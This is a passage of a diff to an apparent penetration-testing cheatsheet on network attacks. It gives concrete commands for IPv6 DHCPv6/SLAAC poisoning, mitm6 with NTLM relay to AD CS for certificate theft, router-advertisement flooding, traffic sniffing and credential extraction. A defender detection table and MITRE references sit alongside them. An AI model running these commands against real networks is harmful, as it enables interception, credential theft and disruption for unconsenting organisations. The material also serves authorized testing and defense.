-# For bulk flooding (DoS): sudo flood_router6 eth0  (THC-IPv6 toolkit)
-# Combine with rogue DNS (dnschef on IPv6) for full traffic interception
-# Detection note: RA Guard blocks this but most orgs have not deployed it
+### DHCPv6 Poisoning and THC-IPV6
+
+```bash
+sudo atk6-fake_dhcps6 eth0 fd00::99 fe80::1 corp.local   # fake DHCPv6 server
+sudo atk6-alive6 eth0                                      # discover IPv6 hosts
+sudo atk6-fake_router6 eth0 fd00::/64                      # SLAAC prefix injection
+sudo atk6-parasite6 eth0                                   # ICMPv6 neighbor spoofing
+sudo atk6-flood_router6 eth0                                # RA flood (DoS)
+```
+
+### NTLM Relay via IPv6
+
+```bash
+sudo mitm6 -d corp.local -i eth0 --ignore-nofqdn
+impacket-ntlmrelayx -6 -t http://ca.corp.local/certsrv/certfnsh.asp \
+  -smb2support --adcs --template Machine                    # relay to ADCS for cert theft
 ```
 
 ---
 
-## Network Sniffing
+## Sniffing and Traffic Analysis
 
-Passive traffic analysis reveals credentials, internal services, network architecture, and communication patterns without generating any attack traffic.
+Passive sniffing generates zero noise. Start here before any active technique.
 
-### Targeted Capture and Credential Extraction
+### tcpdump
 
 ```bash
-# Capture authentication traffic by protocol
-sudo tcpdump -i eth0 -w /tmp/smb.pcap 'port 445 or port 139'
-sudo tcpdump -i eth0 -w /tmp/cleartext.pcap 'port 21 or port 23 or port 389'
-sudo tcpdump -i eth0 -w /tmp/full_capture.pcap
+sudo tcpdump -i eth0 -w capture.pcap -nn                                         # full capture
+sudo tcpdump -i eth0 -w auth.pcap -nn 'port 21 or port 23 or port 25 or port 445 or port 80'
+sudo tcpdump -i eth0 -w broadcast.pcap -nn 'udp port 5355 or udp port 137 or udp port 5353'
+sudo tcpdump -i eth0 -w dhcp.pcap -nn 'udp port 67 or udp port 68'
+```
 
-# Automatic credential extraction from pcap (NTLM, HTTP, FTP, SMTP, SNMP)
-sudo python3 Pcredz -f /tmp/full_capture.pcap
+### Wireshark Display Filters
 
-# Real-time credential sniffing
-sudo python3 net-creds.py -i eth0
+```text
+http.authbasic                          HTTP Basic Auth
+ftp.request.command == "PASS"           FTP password
+smtp.req.parameter contains "AUTH"      SMTP auth
+ntlmssp                                 NTLM SSP traffic
+ntlmssp.auth.username                   NTLM username
+smb2.cmd == 1                           SMB session setup
+dns.qry.name contains "wpad"            WPAD queries
+llmnr                                   LLMNR broadcast
+arp.duplicate-address-detected          ARP anomalies
+vlan                                    802.1Q frames
+snmp.community                          SNMP strings
+kerberos.msg.type == 10                 Kerberos AS-REQ
+```
 
-# Key Wireshark display filters:
-#   ntlmssp.messagetype == 0x00000003         (NTLM auth)
-#   kerberos.msg.type == 10                    (Kerberos AS-REQ)
-#   http.request.method == "POST"              (HTTP credentials)
-#   ftp.request.command == "USER" || ftp.request.command == "PASS"
-#   snmp.community                             (SNMP community strings)
+### Credential Extraction
+
+```bash
+python3 Pcredz -f capture.pcap                                                    # from pcap
+sudo python2 net-creds.py -i eth0                                                 # real-time
+tshark -r capture.pcap -Y "http.request.method == POST" \
+  -T fields -e http.host -e http.request.uri -e urlencoded-form.value             # HTTP POST
 ```
 
 ---
 
 ## Detection / Defender View
 
-| Attack | Detection Method | Defensive Control |
-|---|---|---|
-| ARP spoofing | Duplicate IP-MAC mappings, ARP storm alerts, IDS signatures | Dynamic ARP Inspection (DAI), static ARP entries for critical hosts |
-| LLMNR/NBT-NS poisoning | Multicast traffic spikes, unexpected SMB auth to unknown hosts | Disable LLMNR and NBT-NS via GPO, use DNS suffixes |
-| DNS poisoning | Mismatched DNS responses, TTL anomalies, multiple answers for one query | DNSSEC, DNS monitoring, outbound DNS restricted to authorized resolvers |
-| SSL stripping | HTTP connections to known HTTPS-only services, certificate warnings | HSTS preloading, certificate pinning, TLS inspection on egress proxy |
-| VLAN hopping | DTP negotiation from access ports, frames with unexpected VLAN tags | Disable DTP on all access ports, set native VLAN to unused VLAN |
-| DHCP attacks | Multiple DHCP requests from different MACs on one port, rogue DHCP offers | DHCP snooping, port security with MAC limits |
-| 802.1X bypass | Multiple MACs on an authenticated port, MAC address changes | 802.1X with per-MAC authentication, MACSec encryption |
-| IPv6 attacks | Unexpected Router Advertisements, DHCPv6 from unknown sources | RA Guard, DHCPv6 Guard, disable IPv6 if not used |
-| Network sniffing | Promiscuous mode detection, unusual traffic volume on monitoring ports | Network encryption (IPsec, MACSec), switch port monitoring |
+| Attack | Primary Detection | Key Indicators |
+|--------|------------------|----------------|
+| ARP Spoofing | Duplicate MAC for gateway IP, ARP storms | DAI logs, IDS ARP anomaly signatures |
+| LLMNR/NBT-NS Poisoning | Unexpected multicast responses, SMB auth to unknown hosts | Event 4697, network IDS, LLMNR traffic spikes |
+| DNS Poisoning | Mismatched DNS responses, TTL anomalies | DNS query logs, RPZ alerts, DNSSEC validation failures |
+| MITM / SSL Strip | HTTP on known HTTPS-only services, cert warnings | HSTS preload failures, proxy logs, certificate transparency |
+| VLAN Hopping | DTP frames from access ports, double-tagged frames | Switch port security logs, unexpected 802.1Q frames |
+| DHCP Starvation | Rapid DHCP discover flood from random MACs | DHCP snooping violations, unusual OUI patterns |
+| Rogue DHCP | Multiple DHCP offers, conflicting gateway/DNS | DHCP snooping trusted port violations |
+| 802.1X Bypass | MAC flapping, multiple MACs on authenticated port | Port security violations, 802.1X re-auth failures |
+| IPv6 SLAAC/DHCPv6 | Unexpected RAs, DHCPv6 from unknown source | RA Guard violations, NDPMon alerts |
+| Passive Sniffing | Promiscuous NIC mode | Promiscuous detection scripts, switch SPAN alerts |
 
-Network defenders should prioritize: enabling DAI and DHCP snooping on all switches, disabling LLMNR/NBT-NS enterprise-wide, enforcing SMB signing, deploying RA Guard on IPv6-capable switches, and setting all access ports to nonegotiate mode with a dedicated unused native VLAN.
+Defender controls you will encounter:
+
+- **Dynamic ARP Inspection (DAI)** -- validates ARP against DHCP snooping table; blocks ARP spoofing.
+- **DHCP Snooping** -- restricts DHCP to trusted ports; prevents rogue DHCP and starvation.
+- **Port Security** -- limits MACs per port; blocks starvation and MAB spoofing.
+- **RA Guard** -- filters unauthorized Router Advertisements; blocks mitm6/SLAAC.
+- **SMB Signing / LDAP Signing+Channel Binding** -- blocks NTLM relay.
+- **Native VLAN hardening** (unused VLAN as native) -- defeats double tagging.
+- **Private VLANs** -- prevents same-VLAN host-to-host traffic; limits ARP spoof scope.
+- **NDR** (Darktrace, Vectra, ExtraHop) -- detects anomalous lateral traffic.
 
 ---
 
 ## Engagement Cheatsheet
 
 ```text
-PRE-ENGAGEMENT
-  [ ] Written authorization specifying which network segments are in scope
-  [ ] Coordination with network operations (maintenance window for disruptive tests)
-  [ ] Rollback procedures documented for ARP, DHCP, and VLAN attacks
-  [ ] Attack machine configured: IP forwarding, tool dependencies, capture storage
-  [ ] Baseline network scan completed (know what is normal before you disrupt it)
-
-PASSIVE RECONNAISSANCE
-  [ ] Network sniffing: identify subnets, VLANs, gateways, DNS servers
-  [ ] Responder in analyze mode: observe broadcast name resolution traffic
-  [ ] Identify high-value targets: domain controllers, file servers, admin workstations
-  [ ] Map VLAN assignments and inter-VLAN routing
-
-ACTIVE EXPLOITATION
-  [ ] Responder poisoning: capture NTLMv2 hashes from LLMNR/NBT-NS
-  [ ] ARP spoofing: targeted MITM against specific hosts (not broadcast)
-  [ ] VLAN hopping: attempt DTP negotiation, double tagging
-  [ ] IPv6 attacks: mitm6 for DNS takeover and credential relay
-  [ ] DHCP attacks: rogue server deployment (coordinate with blue team)
-  [ ] Crack captured hashes; relay where cracking is impractical
-
-POST-ENGAGEMENT
-  [ ] Stop all poisoning and spoofing; verify network has recovered
-  [ ] Confirm no residual ARP cache corruption on critical hosts
-  [ ] Remove rogue DHCP leases and IPv6 router advertisements
-  [ ] Compile intercepted credentials, captured traffic, and network gaps
-  [ ] Recommendations: DAI, DHCP snooping, LLMNR disable, SMB signing,
-      RA Guard, switch port hardening, network segmentation review
+SCENARIO                              TECHNIQUE                    TOOL / COMMAND
+------------------------------------  ---------------------------  ------------------------------------------------
+Harvest creds passively               LLMNR/NBT-NS poisoning      responder -I eth0 -wrf
+Creds captured, won't crack           NTLM relay                  ntlmrelayx -tf targets.txt -smb2support
+MITM a specific host                  ARP spoof + sniff           bettercap: arp.spoof on + net.sniff on
+Intercept HTTPS traffic               SSL strip + HSTS bypass     sslstrip+ / dns2proxy / bettercap http.proxy
+Reach another VLAN                    DTP trunk negotiation       yersinia dtp -attack 1
+Reach VLAN (DTP disabled)             Double tagging              scapy: Dot1Q(vlan=1)/Dot1Q(vlan=target)
+Exhaust DHCP, become gateway          Starvation + rogue DHCP     dhcpstarv + dnsmasq rogue config
+Bypass 802.1X (MAB fallback)          MAC spoofing                macchanger -m <auth_mac> eth0
+Bypass 802.1X (physical)              Bridge insertion             ip link add br0 type bridge
+IPv6 DNS takeover + relay             SLAAC/DHCPv6 poisoning      mitm6 -d domain + ntlmrelayx -6
+Passive recon only                    Traffic sniffing             tcpdump -i eth0 -w capture.pcap
+Extract creds from capture            Credential extraction        PCredz -f capture.pcap / net-creds
+Disrupt STP topology                  STP root bridge attack       yersinia stp -attack 4
+Poison from Windows foothold          Windows-native poisoning     Inveigh -LLMNR Y -NBNS Y
 ```
+
+MITRE ATT&CK references:
+
+- T1557 -- Adversary-in-the-Middle
+- T1557.001 -- LLMNR/NBT-NS Poisoning and SMB Relay
+- T1557.002 -- ARP Cache Poisoning
+- T1557.003 -- DHCP Spoofing
+- T1040 -- Network Sniffing
+- T1599 -- Network Boundary Bridging
 
 ---
 
 ## Key References
 
-- MITRE ATT&CK T1557 -- Adversary-in-the-Middle (T1557.001 LLMNR/NBT-NS, T1557.002 ARP Cache Poisoning, T1557.003 DHCP Spoofing)
-- MITRE ATT&CK T1040 -- Network Sniffing
-- Bettercap -- https://www.bettercap.org
-- Responder -- https://github.com/lgandx/Responder
-- mitm6 -- https://github.com/dirkjanm/mitm6
-- Ettercap -- https://www.ettercap-project.org
-- Inveigh -- https://github.com/Kevin-Robertson/Inveigh
-- impacket (ntlmrelayx) -- https://github.com/fortra/impacket
-- THC-IPv6 -- https://github.com/vanhauser-thc/thc-ipv6
-- Yersinia -- https://github.com/tomac/yersinia
-- Wireshark -- https://www.wireshark.org
-- PCredz -- https://github.com/lgandx/PCredz
+- Bettercap documentation: https://www.bettercap.org/modules/
+- Responder: https://github.com/lgandx/Responder
+- mitm6: https://github.com/dirkjanm/mitm6
+- Impacket (ntlmrelayx): https://github.com/fortra/impacket
+- Ettercap: https://www.ettercap-project.org/
+- Yersinia: https://github.com/tomac/yersinia
+- THC-IPV6: https://github.com/vanhauser-thc/thc-ipv6
+- Inveigh: https://github.com/Kevin-Robertson/Inveigh
+- Scapy: https://scapy.readthedocs.io/
+- PCredz: https://github.com/lgandx/PCredz
+- Singularity (DNS rebinding): https://github.com/nccgroup/singularity
+- The Hacker Recipes -- NTLM relay: https://www.thehacker.recipes/ad/movement/ntlm/relay
+- MITRE ATT&CK T1557: https://attack.mitre.org/techniques/T1557/
+- MITRE ATT&CK T1040: https://attack.mitre.org/techniques/T1040/
